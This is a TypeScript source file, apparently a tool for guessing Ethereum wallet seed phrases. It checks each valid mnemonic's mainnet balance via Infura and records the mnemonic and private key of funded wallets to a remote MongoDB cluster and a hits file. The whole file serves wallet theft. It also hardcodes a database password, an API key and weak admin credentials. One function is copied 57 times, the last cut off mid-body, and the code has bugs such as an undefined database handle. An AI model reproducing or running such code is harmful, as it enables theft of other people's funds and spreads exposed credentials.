import { ethers } from "ethers";
import * as crypto from "crypto";
import bip39 from "bip39";
import * as fs from "fs";
import chalk from "chalk";
import { MongoClient } from "mongodb";
const readline = require('readline');


// MongoDB connection string
const uri =
  "mongodb+srv://drxrd:23892389@cluster0.uu2znv3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
const client = new MongoClient(uri);
const ethToUsd: any = 3000;
let approve = false;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Define an array of credentials
const credentials = [
  { username: "user1", password: "pass1" },
  { username: "user2", password: "pass2" },
  { username: "admin", password: "admin123" }
];

// Function to check provided credentials against the credentials array
function checkCredentials(inputUsername: string, inputPassword: string): boolean {
  return credentials.some(cred => cred.username === inputUsername && cred.password === inputPassword);
}

function queryInput(prompt, callback) {
  // Mute stdout to hide the password
  const isPassword = prompt.toLowerCase().includes("password");
  if (isPassword) {
      rl.stdoutMute = true;
      rl._writeToOutput = function _writeToOutput(stringToWrite) {
          if (rl.stdoutMute)
              rl.output.write("*");
          else
              rl.output.write(stringToWrite);
      };
  }

  rl.question(prompt, (input) => {
      rl.stdoutMute = false;  // Unmute output
      callback(input);  // Pass the input to the callback function
  });
}

async function connectDB() {
  try {
    await client.connect();
    // console.log("Connected successfully to MongoDB");
    return client.db("yourDatabaseName"); // Specify your database name here
  } catch (error) {
    return;
  }
}

async function getCommonData(
  balance: any,
  wallet: any,
  transectionCount: any,
  mnemonic: any
) {
  const ethBal = ethers.formatEther(balance.toString());
  const usdBal = parseFloat(ethBal) * ethToUsd;
  // console.log(
  //   chalk.yellow(
  //     `Address:           ${chalk.bold(wallet.address)}\n` +
  //       `Total Transection: ${chalk.bold(transectionCount)}\n` +
  //       `Mnemonic Phrase:   ${chalk.bold(mnemonic)}\n` +
  //       `Private Key:       ${chalk.bold(wallet.privateKey)}\n` +
  //       `Balance:           ${chalk.bold(`${ethBal} ETH`)} & ${chalk.bold(
  //         `${usdBal}USD`
  //       )}`
  //   )
  // );

  const result = `MEMO=${mnemonic},ETH=${ethBal},USD=${usdBal},PvtKey=${wallet.privateKey},TotalTxn=${transectionCount}`;
  // sendMessageToTelegram(result);
  const walletData = {
    mnemonic: mnemonic,
    privateKey: wallet.privateKey,
    address: wallet.address,
    totalTransection: transectionCount,
    ethBalance: ethBal,
    usdBalance: usdBal,
  };

  if (usdBal > 0.1) {
    console.log(chalk.greenBright(result));
    await db.collection("positive_balances").insertOne(walletData);
    fs.appendFileSync("hits.txt", result + "\n", "utf-8");
  }
  fs.appendFileSync("result.txt", result + "\n", "utf-8");
}

async function s1(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s2(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s3(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s4(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s5(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s6(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s7(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s8(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s9(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s10(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s11(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s12(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s13(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s14(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s15(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s16(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s17(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s18(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s19(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s20(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s21(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s22(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s23(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s24(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s25(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s26(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s27(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s28(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s29(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s30(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s31(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s32(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}

async function s33(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s34(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s35(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s36(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s37(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s38(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s39(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s40(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s41(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s42(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s43(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s44(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s45(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s46(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s47(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s48(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s49(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s50(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s51(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s52(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s53(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s54(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s55(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s56(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
    const provider = new ethers.InfuraProvider(
      "mainnet",
      "fe0b908ab55a4825b863b155353b1876"
    ); // Replace with your Infura project ID
    const balance = await provider.getBalance(wallet.address);
    const transectionCount = await provider.getTransactionCount(wallet.address);
    getCommonData(balance, wallet, transectionCount, mnemonic);
  } catch (error) {
    return;
  }
}
async function s57(mnemonic: string, db: any): Promise<void> {
  try {
    if (!bip39.validateMnemonic(mnemonic)) return;

    const wallet = ethers.Wallet.fromPhrase(mnemonic);
